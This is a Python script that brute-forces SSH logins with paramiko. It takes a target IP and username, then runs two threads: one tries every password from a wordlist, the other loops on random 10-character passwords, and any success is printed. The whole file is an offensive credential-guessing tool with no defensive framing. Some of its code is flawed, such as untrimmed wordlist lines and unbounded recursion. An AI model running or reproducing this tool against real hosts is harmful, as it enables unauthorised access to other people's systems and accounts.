import paramiko
from threading import Thread
import string
import random

ip = str(input("Please Enter the IP address:"))
username = str(input("Please Enter the username:"))
passwords_file = str(input("Please Enter the path of the password wordlist: "))


def connect_to_target(password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)
    result = False

    try:
        ssh.connect(ip, port=22, username=username, password=password)
        print(f"Success, the password for user: {username} is {password}")
        result = True
    except paramiko.AuthenticationException:
        print("Authentication failed, trying another password")
        result = False

    ssh.close()

    return result


def read_from_wordlist(wordlist):
    file = open(wordlist, "r")
    for password in file:
        connect_to_target(password)

    file.close()


def generate_random_password():
    # characters to generate password from
    characters = list(string.ascii_letters + string.digits + "!@#$%^&*()")

    # shuffling the characters
    random.shuffle(characters)

    # picking random characters from the list
    password = []
    for i in range(10):
        password.append(random.choice(characters))

    # shuffling the result password
    random.shuffle(password)

    # converting the list to string
    return "".join(password)


def connect_with_random_password():
    password = generate_random_password()

    is_connected = connect_to_target(password)

    if not is_connected:
        connect_with_random_password()


def main():
    # define the threads
    t1 = Thread(target=read_from_wordlist, args=(passwords_file,))
    t2 = Thread(target=connect_with_random_password)

    # start the tread
    t1.start()
    t2.start()

    # join to the main thread
    t1.join()
    t2.join()


main()
